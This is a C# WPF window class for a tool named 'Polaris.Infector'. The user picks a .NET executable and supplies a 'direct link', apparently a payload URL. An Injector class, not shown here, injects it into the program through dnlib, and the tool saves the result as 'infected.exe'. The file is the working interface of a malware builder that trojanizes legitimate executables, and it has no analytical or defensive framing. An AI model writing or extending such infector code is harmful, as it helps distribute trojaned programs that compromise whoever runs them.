using System.Windows;
using System.Windows.Input;
using System.Windows.Forms;
using Polaris.Infector.Injection;
using dnlib.DotNet;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace Polaris.Infector
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void FileToInfectTextBox_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            using (OpenFileDialog dialog = new OpenFileDialog())
            {
                dialog.Title = "Select a .NET Executable";
                dialog.Filter = ".NET Executable|*.exe";

                if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    FileToInfectTextBox.Text = dialog.FileName;
                    InfectButton.IsEnabled = true;
                }
            }
        }

        private async void InfectButton_Click(object sender, RoutedEventArgs e)
        {
            var module = ModuleDefMD.Load(FileToInfectTextBox.Text);
            using (Injector injector = new Injector(module))
            {
                InfectButton.IsEnabled = false;
                InfectButton.Content = "Infecting...";
                await injector.DoInjection(DirectLinkTextBox.Text);

                var folder = Path.GetDirectoryName(FileToInfectTextBox.Text);

                await Task.Run(() => { module.Write(folder + "\\infected.exe", 
                    new dnlib.DotNet.Writer.ModuleWriterOptions(module) { Logger = DummyLogger.NoThrowInstance}); });
                Process.Start(folder);
            }
            InfectButton.IsEnabled = true;
            InfectButton.Content = "Infect";
        }
    }
}
